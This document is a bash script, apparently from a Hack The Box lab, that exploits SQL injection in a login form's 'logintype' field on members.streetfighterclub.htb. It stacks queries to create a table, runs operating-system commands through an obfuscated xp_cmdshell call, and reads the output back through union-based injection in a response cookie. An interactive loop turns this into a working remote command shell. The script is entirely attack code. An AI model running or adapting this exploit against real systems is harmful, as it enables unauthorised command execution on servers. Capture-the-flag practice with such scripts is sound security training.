#!/bin/bash

main_url="http://members.streetfighterclub.htb/old/verify.asp"

function createTable {
    curl -X POST -d 'username=admin&password=admin&logintype=2;create table rce(id int identity(1,1) primary key, output varchar(1024));-- -&rememberme=ON&B1=LogIn' "$main_url"
}

function truncateTable {
    curl -X POST -d 'username=admin&password=admin&logintype=2;truncate table rce;-- -&rememberme=ON&B1=LogIn' "$main_url"
}

function executeCommand {
    command="$1"
    curl -X POST -d "username=admin&password=admin&logintype=2;insert into rce(output) exec Xp_cMdShEll \"$command\";-- -&rememberme=ON&B1=LogIn" "$main_url"

    topIdCounter=$(curl -X POST -d 'username=admin&password=admin&logintype=2 union select 1,2,3,4,(select top 1 id from rce order by id desc),6-- -&rememberme=ON&B1=LogIn' "$main_url" --dump-header - | grep -o 'Email=.*' | cut -d ';' -f 1 | sed 's/Email=//;s/%3D/=/')

    for ((i = 1; i < topIdCounter; i++)); do
        output=$(curl -X POST -d "username=admin&password=admin&logintype=2 union select 1,2,3,4,(select output from rce where id=$i),6-- -&rememberme=ON&B1=LogIn" "$main_url" --dump-header - | grep -o 'Email=.*' | cut -d ';' -f 1 | sed 's/Email=//;s/%3D/=/')
        if [[ $output != *"\xeb\xde\x94\xd8"* ]]; then
            echo "$output"
        fi
    done

    truncateTable
}

function dropTable {
    curl -X POST -d 'username=admin&password=admin&logintype=2;drop table rce;-- -&rememberme=ON&B1=LogIn' "$main_url"
}

createTable

while true; do
    read -p "> " command
    executeCommand "$command"
done

